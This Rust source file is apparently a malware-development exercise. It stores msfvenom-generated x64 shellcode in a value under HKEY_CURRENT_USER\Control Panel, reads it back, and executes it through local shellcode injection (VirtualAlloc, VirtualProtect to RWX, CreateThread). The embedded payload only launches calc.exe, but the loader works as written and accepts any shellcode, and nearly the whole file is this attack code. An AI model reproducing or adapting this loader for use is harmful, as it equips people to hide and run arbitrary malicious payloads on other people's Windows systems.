use core::ffi::c_void;
use windows::{
    core::PCSTR,
    Win32::{
        Foundation::{CloseHandle, ERROR_SUCCESS},
        System::{
            Memory::{
                VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
                PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
            },
            Registry::{
                RegCloseKey, RegGetValueA, RegOpenKeyExA, RegSetValueExA, HKEY, HKEY_CURRENT_USER,
                KEY_ALL_ACCESS, REG_BINARY, RRF_RT_ANY,
            },
            Threading::{
                CreateThread, WaitForSingleObjectEx, INFINITE, THREAD_CREATE_RUN_IMMEDIATELY,
            },
        },
    },
};

// const refs to registry key (path) and value; they need to be cast to a `PCSTR` before they
// can be used, but Rust does not yet implement this at compile time without e.g `lazy_static`
// (as far as i'm aware).
const REG_PATH: &str = "Control Panel\0";
const REG_VAL: &str = "EXAMPLE_smile\0";

// $ msfvenom -a x64 --platform windows -p windows/x64/exec cmd='cmd.exe /c calc.exe' -f rust
const SHELLCODE: [u8; 287] = [
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
    0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
    0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed,
    0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
    0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
    0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
    0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
    0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
    0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
    0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
    0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b,
    0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47,
    0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x6d, 0x64, 0x2e, 0x65,
    0x78, 0x65, 0x20, 0x2f, 0x63, 0x20, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
];

// writes shellcode to registry value `regval` under the `regpath` key
fn write_shellcode(shellcode: &[u8], regpath: PCSTR, regval: PCSTR) -> bool {
    let mut h_key: HKEY = HKEY::default();
    unsafe {
        // open a handle to a registry key
        if RegOpenKeyExA(
            HKEY_CURRENT_USER as HKEY, // opens key at `HKEY_CURRENT_USER\<regpath>`
            regpath,
            0,
            KEY_ALL_ACCESS, // `samDesired` flag could be lower access tier
            &mut h_key as *mut HKEY,
        ) != ERROR_SUCCESS
        {
            return false; // failed to open handle
        }

        // use the handle to the registry key to write binary data to specified registry value
        if RegSetValueExA(h_key, regval, 0, REG_BINARY, Some(shellcode)) != ERROR_SUCCESS {
            return false; // failed to write payload
        }

        // close the handle (ignore the `WIN32_ERROR` returned from this function)
        let _ = RegCloseKey(h_key);
        return true;
    }
}

fn read_shellcode(regpath: PCSTR, regval: PCSTR) -> Option<Vec<u8>> {
    let mut sz_payload = 0u32;
    unsafe {
        // read the size of the stored payload from the
        // registry
        if RegGetValueA(
            HKEY_CURRENT_USER,
            regpath,
            regval,
            RRF_RT_ANY,
            None,
            None,
            Some(&mut sz_payload as *mut u32),
        ) != ERROR_SUCCESS
        {
            return None; // registry read for payload size failed
        }

        // allocate vector with payload size and init a pointer to the
        // vector to pass to `RegGetValueA`
        let mut buffer: Vec<u8> = Vec::with_capacity(sz_payload as usize);
        let p_buff = buffer.as_mut_ptr();

        // read registry entry
        if RegGetValueA(
            HKEY_CURRENT_USER,
            regpath,
            regval,
            RRF_RT_ANY,
            None,
            Some(p_buff as *mut c_void), // pass the pointer to api call
            Some(&mut sz_payload as *mut u32),
        ) != ERROR_SUCCESS
        {
            return None; // registry read for payload data failed
        }

        // set the length of the buffer and return it
        buffer.set_len(sz_payload as usize);
        return Some(buffer);
    }
}

// classic local shellcode injection
fn exec_shellcode(shellcode: Vec<u8>) {
    unsafe {
        // allocate memory in local process
        let p_base_addr = VirtualAlloc(
            None,
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if p_base_addr.is_null() {
            return;
        }

        // copy shellcode into allocation
        std::ptr::copy(
            shellcode.as_ptr() as _,
            p_base_addr as *mut u8,
            shellcode.len(),
        );

        // extend RW protection to RWX
        let mut old_protect: PAGE_PROTECTION_FLAGS = PAGE_READWRITE;
        if VirtualProtect(
            p_base_addr,
            shellcode.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        )
        .is_err()
        {
            return;
        }

        // execute shellcode in a new thread
        let entry: extern "system" fn(*mut c_void) -> u32 = { std::mem::transmute(p_base_addr) };
        let h_thread = CreateThread(
            None,
            0,
            Some(entry),
            None,
            THREAD_CREATE_RUN_IMMEDIATELY,
            None,
        );

        if h_thread.is_err() {
            return;
        }

        let h_thread = h_thread.unwrap();

        // close the thread handle when the thread returns
        WaitForSingleObjectEx(h_thread, INFINITE, false);
        CloseHandle(h_thread).unwrap();

        // i think the `WaitForSingleObject` call never works right because the msfvenom
        // shellcode terminates the thread once the command is executed but idk idk

        return;
    }
}

fn main() {
    // convert &str to PCSTR for api fn calls
    let p_regpath: PCSTR = PCSTR::from_raw(REG_PATH.as_ptr());
    let p_regval: PCSTR = PCSTR::from_raw(REG_VAL.as_ptr());

    if write_shellcode(&SHELLCODE, p_regpath, p_regval) {
        println!("[+] Registry write ok.");
    }

    let shellc = match read_shellcode(p_regpath, p_regval) {
        Some(sh) => sh,
        None => panic!("[x] Couldn't read shellcode from supplied registry k/v"),
    };

    print!(
        "[+] Read shellcode from registry ok ({} bytes): {:#?}",
        shellc.len(),
        shellc
    );

    exec_shellcode(shellc);
}
